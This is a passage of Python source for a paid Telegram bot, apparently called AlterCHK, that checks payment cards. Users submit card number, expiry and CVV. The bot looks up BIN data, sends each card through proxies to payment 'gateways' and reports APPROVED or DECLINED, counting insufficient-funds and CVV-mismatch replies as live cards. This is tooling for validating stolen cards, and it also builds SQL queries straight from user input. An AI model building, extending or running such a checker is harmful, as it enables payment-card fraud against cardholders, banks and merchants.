        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDrr import RyukCHK
        CheckRecive = await RyukCHK(CcVerify, CheckedP[1])

        fin = f'{time.time()-inicio}'
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ric"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Rygel [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Rygel [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Rygel [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ric')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDric import RyukCHK
        CheckRecive = await RyukCHK(CcVerify, CheckedP[1])

        fin = f'{time.time()-inicio}'
        if CheckRecive == 'Subscription Completed' :
            Status = '[ APPROVED ✅ ]'
        elif (CheckRecive == 'Your transaction was declined due to insufficient funds in your account. Please use a different card or contact your bank.') or (CheckRecive == 'The security code you entered does not match. Please update the CVV and try again.') :
            Status = '[ APPROVED ✅ ]'
        elif (int(CheckRecive.find('An unexpected error occurred')) >= 0) :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.TelegramAPIError:
            print("Bad Gateway")
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["chk"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Luxy [ 5$ ]'
    TwoNameGateway = 'Gateway ↯ Luxy [ 5$ ]'
    ThreeGateway = 'Gateway 🔥 Luxy [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('chk')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
